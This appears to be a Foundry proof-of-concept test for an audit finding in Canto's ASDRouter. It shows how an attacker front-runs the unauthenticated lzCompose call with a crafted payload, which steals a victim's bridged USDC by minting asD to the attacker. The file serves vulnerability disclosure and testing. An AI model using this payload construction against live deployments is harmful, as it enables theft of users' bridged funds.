// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ASDRouter} from "../src/canto/contracts/asd/asdRouter.sol";
import {ASDUSDC} from "../src/canto/contracts/asd/asdUSDC.sol";
import {ASDOFT} from "../src/canto/contracts/asd/asdOFT.sol";
import {ICrocSwapDex, ICrocImpact} from "../src/canto/contracts/ambient/CrocInterfaces.sol";

/*//////////////////////////////////////////////////////////////
              MINIMAL EXTERNAL DOUBLES (truly opaque deps)

  Every contract on the exploit path is the REAL audited Canto source:
    - ASDRouter  (the vulnerable, permissionless composed-message handler)
    - ASDUSDC    (the USDC wrapper)
    - ASDOFT     (the asD LayerZero OFT — its real mint()/transfer() run)
  The doubles below stand in ONLY for external systems the bug does not
  live in: the LayerZero endpoint (cross-chain messaging), the Ambient DEX,
  the Compound cNOTE market, and the source-chain USDC OFT token.
//////////////////////////////////////////////////////////////*/

/// @dev The only endpoint method the real OFT constructor invokes.
contract MockLZEndpoint {
    function setDelegate(address) external {}
}

/// @dev Plain ERC20 with an open mint used for NOTE and the source-chain USDC OFT.
contract MintableERC20 is ERC20 {
    constructor(string memory n, string memory s) ERC20(n, s) {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/// @dev Minimal Compound cNOTE double. underlying() -> NOTE; mint() pulls NOTE and
///      returns 0 (success), exactly what the real ASDOFT.mint() expects.
contract MockCNote {
    address public immutable underlyingToken;

    constructor(address note_) {
        underlyingToken = note_;
    }

    function underlying() external view returns (address) {
        return underlyingToken;
    }

    function mint(uint256 mintAmount) external returns (uint256) {
        IERC20(underlyingToken).transferFrom(msg.sender, address(this), mintAmount);
        return 0;
    }
}

/// @dev Ambient DEX double: reports a live pool, a favourable impact quote, and a
///      1:1 fill that delivers real NOTE to the caller (the router).
contract MockCrocSwap is ICrocSwapDex {
    IERC20 public immutable note;

    constructor(IERC20 note_) {
        note = note_;
    }

    function readSlot(uint256) external pure returns (uint256) {
        return 1; // non-zero pool param => ASDRouter takes the swap branch
    }

    function swap(
        address,
        address,
        uint256,
        bool,
        bool,
        uint128 qty,
        uint16,
        uint128,
        uint128,
        uint8
    ) external payable returns (int128 baseQuote, int128 quoteFlow) {
        // Deliver the NOTE proceeds to the router. Flow leaving the pool is negative,
        // so the router reads amountNote = -flow = qty.
        note.transfer(msg.sender, qty);
        baseQuote = -int128(qty);
        quoteFlow = -int128(qty);
    }
}

contract MockCrocImpact is ICrocImpact {
    function calcImpact(
        address,
        address,
        uint256,
        bool,
        bool,
        uint128 qty,
        uint16,
        uint128
    ) external pure returns (int128 baseFlow, int128 quoteFlow, uint128 finalPrice) {
        baseFlow = -int128(qty);
        quoteFlow = -int128(qty);
        finalPrice = 1e18;
    }
}

/*//////////////////////////////////////////////////////////////
                               PoC
//////////////////////////////////////////////////////////////*/

contract PoC_32130 is Test {
    MintableERC20 internal usdcOFT; // source-chain USDC OFT delivered by LayerZero
    MintableERC20 internal note; // Canto $NOTE
    MockCNote internal cNote;
    ASDUSDC internal asdUSDC;
    ASDOFT internal asd; // REAL asD LayerZero OFT
    ASDRouter internal router; // REAL vulnerable router
    MockCrocSwap internal crocSwap;
    MockCrocImpact internal crocImpact;
    MockLZEndpoint internal lz;

    address internal victim = address(0xBEEF);
    address internal attacker = address(0xA11CE);
    uint32 internal constant CANTO_EID = 1;
    uint256 internal constant AMOUNT = 100e18;

    function setUp() public {
        lz = new MockLZEndpoint();
        usdcOFT = new MintableERC20("USD Coin OFT", "USDC");
        note = new MintableERC20("Note", "NOTE");
        cNote = new MockCNote(address(note));

        asdUSDC = new ASDUSDC();
        // Real asD OFT: name, symbol, LZ endpoint (mocked messaging), cNOTE market, CSR recipient.
        asd = new ASDOFT("asD", "asD", address(lz), address(cNote), address(this));

        crocSwap = new MockCrocSwap(IERC20(address(note)));
        crocImpact = new MockCrocImpact();

        // Production whitelists the source USDC OFT version on the wrapper.
        asdUSDC.updateWhitelist(address(usdcOFT), true);

        // Real deployment params. noteAddress is the real $NOTE token (distinct from asdUSDC),
        // so the full deposit -> swap -> asD-mint -> send pipeline runs end to end.
        router = new ASDRouter(
            address(note), // _noteAddress
            CANTO_EID, // _cantoLzEID
            address(crocSwap), // _crocSwapAddress
            address(crocImpact), // _crocImpactAddress
            address(asdUSDC) // _asdUSDCAddress
        );

        // The Ambient pool holds NOTE liquidity to fill the swap.
        note.mint(address(crocSwap), AMOUNT);

        // --- Transaction 1 (LayerZero receive): the OFT transfer credits the router.
        // LayerZero has already delivered the victim's bridged USDC OFT to ASDRouter,
        // BEFORE the composed message is executed. This is the intermediate state the
        // dual-transaction design exposes.
        usdcOFT.mint(address(router), AMOUNT);
    }

    function test_attackerFrontRunsComposedMessageAndStealsFunds() public {
        // Sanity: victim's funds are sitting in the router awaiting the compose step.
        assertEq(usdcOFT.balanceOf(address(router)), AMOUNT, "precondition: OFT delivered to router");
        assertEq(asd.balanceOf(attacker), 0, "attacker starts with 0 asD");

        // --- Transaction 2 (permissionless compose): the attacker front-runs the executor.
        // ASDRouter.lzCompose has NO caller restriction and never authenticates the
        // receiver embedded in the composed payload against composeFrom. The attacker
        // crafts a payload that mints the asD to THEMSELVES.
        bytes memory composeMsg = abi.encode(
            uint32(CANTO_EID), // _dstLzEid  -> local transfer branch
            attacker, // _dstReceiver  <-- THE THEFT: asD sent here
            address(asd), // _dstAsdAddress (unused on local branch)
            address(asd), // _cantoAsdAddress -> asD vault to mint from
            uint256(0), // _minAmountASD
            victim, // _cantoRefundAddress (never reached on success)
            uint256(0) // _feeForSend
        );

        // LayerZero OFT composed message: nonce | srcEid | amountLD | composeFrom | composeMsg
        bytes memory message = abi.encodePacked(
            uint64(1), // nonce
            uint32(999), // srcEid
            AMOUNT, // amountLD (32 bytes)
            bytes32(uint256(uint160(victim))), // composeFrom = the real user (ignored by router)
            composeMsg
        );

        vm.prank(attacker);
        router.lzCompose(address(usdcOFT), bytes32(uint256(1)), message, attacker, "");

        // --- Harm: the victim's bridged value is converted to asD and handed to the attacker.
        assertEq(asd.balanceOf(attacker), AMOUNT, "attacker stole the minted asD");
        assertEq(asd.balanceOf(victim), 0, "victim received nothing");
        assertEq(usdcOFT.balanceOf(address(router)), 0, "router's delivered OFT was consumed");
        assertEq(note.balanceOf(address(asd)), 0, "asD forwarded NOTE into the cNOTE market");
    }
}
